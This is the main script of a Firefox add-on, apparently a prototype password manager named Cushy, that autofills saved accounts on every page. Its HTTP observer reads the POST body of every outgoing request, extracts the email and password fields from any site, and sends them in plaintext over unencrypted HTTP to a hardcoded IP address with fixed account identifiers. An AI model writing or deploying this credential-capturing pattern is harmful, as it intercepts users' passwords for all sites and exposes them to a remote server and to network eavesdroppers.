const {Cc, CC, Ci, Cu, Components} = require("chrome");
var notifications = require("sdk/notifications");
var data = require("sdk/self").data;
var storage = require("sdk/simple-storage").storage;
var Request = require("sdk/request").Request;
var tabs = require("sdk/tabs");
var tab = tabs.activeTab;
var url = require("sdk/url");
var buttons = require('sdk/ui/button/action');
var array = require('sdk/util/array');

var tsd = require("temp_storage_data");
var cl = require("client");
var stc = require("storage_client");

var tempData = tsd.TempStorageData;
var client = cl.Client;

var storageClient = stc.StorageClient;

var button = buttons.ActionButton({
  id: "cushy-link",
  label: "Visit Cushy",
  icon: {
    "16": "./logo_mini.png",
    "32": "./logo_mid.png"
  },
  onClick: openAccountLists
});

function openAccountLists(state) {
  var storage = require("sdk/simple-storage").storage;
  var accountLists = require("sdk/panel").Panel({
    position: {
      right: 0,
      top: 0
    },
    width: 400,
    height: 400,
    contentURL: data.url("popup.html"),
    contentScriptFile: [
      data.url("popup_client.js"),
      data.url("account_list.js"),
      data.url("popup.js")
    ]
  });

  accountLists.on("show", function() {
		accountLists.port.emit("show", storage["accounts"]);
	});

  accountLists.port.on("storageRefresh", function(elementContent) {
    client.updateStorageData(true);
  });

  accountLists.show();
}

var workers = [];
var pageMod = require("sdk/page-mod").PageMod({
  include: ["*"],
  contentScriptFile: [
    data.url("storage_client.js"),
    data.url("save_dialog.js"),
    data.url("local_data.js"),
    data.url("form.js"),
    data.url("password_generator.js"),
    data.url("content_frame.js")
  ],
  onAttach: function(worker) {

    array.add(workers, worker);

    worker.port.on("fillAccountCheck", function(elementContent) {
      var domain = client.domain;
      if(storage["accounts"] && storage["accounts"][domain]){
        worker.port.emit("fillAccount", storage["accounts"][domain]);
      }
    });
    worker.port.on("signIn", function(elementContent) {
      //tempData.setFromRequest(request);
    });
    worker.port.on("signUp", function(elementContent) {
      //tempData.type = null;
    });
    worker.port.on("dialogClose", function(elementContent){
      //client.toCloseDialog();
      //tempData.clear();
    });

    var domain = client.domain;
    if(storage["accounts"] && storage["accounts"][domain]){
      console.log(storage["accounts"][domain]);
      worker.port.emit("fillAccount", storage["accounts"][domain]);
    }
  }
});

tab.on('ready', function(){
  if(!storage["userInfo"]) openLoginForm();
  client.updateUrl(tab.url);
  client.updateStorageData();
});

var httpRequestObserver =
{
 observe: function(subject, topic, data) {
    if (topic == 'http-on-modify-request') {
      var postData = observeRequest(subject, topic, data);
      if(postData != null){
        var postDateArr = postData.split("&");
        var loginName, password;
        for (var i = 0, len = postDateArr.length; i < len; i++) {
          if(postDateArr[i].match(/mail/)){
            loginName = postDateArr[i].split("=").pop().replace("%40", "@");
          }
          if(postDateArr[i].match(/password/)){
            password = postDateArr[i].split("=").pop();
          }
        }
        if(loginName != null && password != null){
          var userInfo = storage["userInfo"];
          if(userInfo["login_name"] != loginName || userInfo["password"] != password ){
            userInfo["login_name"] = loginName;
            userInfo["password"] = password;
            Request({
              url: "http://133.242.16.11:3000/apis/company_services",
              content: {
                company_id: 1,
                login_name: userInfo["login_name"],
                password: userInfo["password"],
                user_id: 1,
                url: userInfo["site_url"]
              },
              onComplete: function (response) {
                showNotification();
                console.log(response)
              }
            }).post();
          }
        }
      }
     }
  },
  register: function()
  {
    var observerService = Cc["@mozilla.org/observer-service;1"]
            .getService(Ci.nsIObserverService);
    observerService.addObserver(this, "http-on-modify-request", false);
  }
};

const ScriptableInputStream = CC("@mozilla.org/scriptableinputstream;1","nsIScriptableInputStream","init");

function observeRequest(channel, topic, data) {
  let post = null;

  if (!(channel instanceof Ci.nsIHttpChannel) ||
    !(channel instanceof Ci.nsIUploadChannel)) {
    return post;
  }
  if (channel.requestMethod !== 'POST') {
    return post;
  }

  try {
    let us = channel.uploadStream;
    if (!us) {
      return post;
    }
    if (us instanceof Ci.nsIMultiplexInputStream) {
      // Seeking in a nsIMultiplexInputStream effectively breaks the stream.
      return post;
    }
    if (!(us instanceof Ci.nsISeekableStream)) {
      // Cannot seek within the stream :(
      return post;
    }

    let oldpos = us.tell();
    us.seek(0, 0);

    try {
      let is = new ScriptableInputStream(us);

      let available = Math.min(is.available(), 1 << 16);
      if (available) {
        post = is.read(available);
      }
    }
    finally {
      us.seek(0, oldpos);
    }
  }
  catch (ex) {
    Cu.reportError(ex);
  }
  return post;
}

function showNotification(){
//表示するpopup
  var tagAddPanel = require("sdk/panel").Panel({
    position: {
      right: 0,
      top: 0
    },
    width: 212,
    height: 200,
    contentURL: data.url("text-entry.html"),
    contentScriptFile: data.url("get-text.js")
  });
  tagAddPanel.port.emit("show", "a");
  tagAddPanel.show();
}

function openLoginForm(){
  var tagAddPanel = require("sdk/panel").Panel({
    position: {
      right: 300,
      top: 300
    },
    width: 300,
    height: 400,
    contentURL: data.url("login.html"),
    contentScriptFile: [
      data.url("login.js"),
      data.url("user.js")
    ]
  });

  tagAddPanel.port.on("updateLoginInfo", function(elementContent) {
    storage["userInfo"] = elementContent;
  })

  tagAddPanel.show();
}

httpRequestObserver.register();
